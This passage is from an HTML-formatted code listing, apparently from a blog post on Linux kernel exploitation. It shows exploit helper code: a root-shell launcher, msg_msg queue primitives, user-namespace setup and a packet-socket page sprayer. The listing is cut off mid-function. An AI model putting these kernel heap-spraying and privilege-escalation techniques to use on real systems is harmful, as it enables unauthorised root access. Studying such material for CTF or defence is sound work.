class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Kernel Pwn Infrastructures</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS_MSG(msg)    <span class="string">&quot;\033[32m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg)       <span class="string">&quot;\033[34m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR_MSG(msg)      <span class="string">&quot;\033[31m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(ERROR_MSG(<span class="string">&quot;[x] Error at: &quot;</span>) <span class="string">&quot;%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(SUCCESS_MSG(<span class="string">&quot;[*] Process binded to core &quot;</span>) <span class="string">&quot;%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] Failed to get the root!&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_success(<span class="string">&quot;[+] Successful to get the root.&quot;</span>);</span><br><span class="line">    log_info(<span class="string">&quot;[*] Execve root shell now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of potential segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_msg_queue</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * the msgp should be a pointer to the `struct msgbuf`,</span></span><br><span class="line"><span class="comment"> * and the data should be stored in msgbuf.mtext</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">write_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MSG_COPY</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">peek_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, </span><br><span class="line">                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">unshare_setup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] Unable to create new namespace for PGV subsystem&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EPERM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pgv pages sprayer related </span></span><br><span class="line"><span class="comment"> * not that we should create two process:</span></span><br><span class="line"><span class="comment"> * - the parent is the one to send cmd and get root</span></span><br><span class="line"><span class="comment"> * - the child creates an isolate userspace by calling unshare_setup(),</span></span><br><span class="line"><span class="comment"> *      receiving cmd from parent and operates it only</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_SOCKET_MAX_NR 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> cmd;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    PGV_CMD_ALLOC_SOCKET,</span><br><span class="line">    PGV_CMD_ALLOC_PAGE,</span><br><span class="line">    PGV_CMD_FREE_PAGE,</span><br><span class="line">    PGV_CMD_FREE_SOCKET,</span><br><span class="line">    PGV_CMD_EXIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_packet_socket</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> socket_fd;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line"></span><br><span class="line">err_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_socket_pages</span><span class="params">(<span class="type">int</span> socket_fd, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> version, ret;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, </span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_setsockopt:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">free_socket_pages</span><span class="params">(<span class="type">int</span> socket_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = <span class="number">0x3361626e</span>;</span><br><span class="line">    req.tp_block_nr = <span class="number">0</span>;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x74747261</span>;</span><br><span class="line">    req.tp_frame_nr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_setsockopt:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_cmd_handler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd[PGV_SOCKET_MAX_NR];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create an isolate namespace*/</span></span><br><span class="line">    <span class="keyword">if</span> (unshare_setup()) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to initialize PGV subsystem for page spraying!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(socket_fd, <span class="number">0</span>, <span class="keyword">sizeof</span>(socket_fd));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handler request */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (req.cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> PGV_CMD_ALLOC_SOCKET:</span><br><span class="line">            <span class="keyword">if</span> (socket_fd[req.idx] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(ERROR_MSG(<span class="string">&quot;[x] Duplicate idx request: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>,req.idx);</span><br><span class="line">                ret = -EINVAL;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ret = create_packet_socket();</span><br><span class="line">            <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(ERROR_MSG(<span class="string">&quot;[x] Failed at allocating packet socket&quot;</span>));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            socket_fd[req.idx] = ret;</span><br><span class="line">            ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> PGV_CMD_ALLOC_PAGE:</span><br><span class="line">            <span class="keyword">if</span> (socket_fd[req.idx] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(ERROR_MSG(<span class="string">&quot;[x] No socket fd for idx: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>,req.idx);</span><br><span class="line">                ret = -EINVAL;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ret = alloc_socket_pages(socket_fd[req.idx], req.size, req.nr);</span><br><span class="line">            <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(ERROR_MSG(<span class="string">&quot;[x] Failed to alloc packet socket pages&quot;</span>));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> PGV_CMD_FREE_PAGE:</span><br><span class="line">            <span class="keyword">if</span> (socket_fd[req.idx] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(ERROR_MSG(<span class="string">&quot;[x] No socket fd for idx: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>,req.idx);</span><br><span class="line">                ret = -EINVAL;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ret = free_socket_pages(socket_fd[req.idx]);</span><br><span class="line">            <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(ERROR_MSG(<span class="string">&quot;[x] Failed to free packet socket pages&quot;</span>));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> PGV_CMD_FREE_SOCKET:</span><br><span class="line">            <span class="keyword">if</span> (socket_fd[req.idx] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(ERROR_MSG(<span class="string">&quot;[x] No socket fd for idx: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>,req.idx);</span><br><span class="line">                ret = -EINVAL;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            close(socket_fd[req.idx]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> PGV_CMD_EXIT:</span><br><span class="line">            log_info(<span class="string">&quot;[*] PGV child exiting...&quot;</span>);</span><br><span class="line">            ret = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERROR_MSG(<span class="string">&quot;[x] PGV child got unknown command : &quot;</span>)<span 